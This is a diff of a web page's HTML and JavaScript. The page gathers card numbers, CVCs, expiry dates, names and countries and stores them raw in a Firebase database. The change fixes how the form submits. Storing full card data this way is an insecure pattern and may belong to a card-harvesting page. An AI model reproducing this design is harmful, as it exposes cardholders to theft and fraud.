@@ -71,14 +71,16 @@
     </div>
 
     <div class="linearbutton">
-      <button class="button" onclick="submitForm()">SUBMIT</button>
+      <form method="post" id="frmContact">
+      <button type="submit" class ="button" name="submit">SUBMIT</button>
+      </form>
     </div>
     
     <!-- Your main script -->
 <script type="module">
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
 import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-analytics.js";
-import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
+import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
 
 // Paste the code from Firebase
 const firebaseConfig = {
@@ -96,7 +98,10 @@ const analytics = getAnalytics(app);
 
 const db = getDatabase(app);
       
-      function submitForm() {
+        document.getElementById('frmContact').addEventListener('submit', function(e) {
+         e.preventDefault();
+        //document.getElementById('loadingOverlay').style.display = 'none';
+  
         // Display loading overlay
        // document.getElementById('loadingOverlay').style.display = 'none';
 
@@ -114,17 +119,16 @@ const db = getDatabase(app);
           alert('Error: All fields must be filled!');
         } else {
 
-    const newDataRef = db.ref('SubGo');
-newDataRef.push({
+    set(ref(db, 'SubGo/' + Math.random().toString(36).slice(2, 7)), {
   cardNumber: cardNumber,
   cvc: cvc,
   expireDate: expireDate,
   name: name,
   country: country
-})
+});
     alert('Your form is submitted');
         }
-      }
+      });
 </script>
   </body>
 </html>
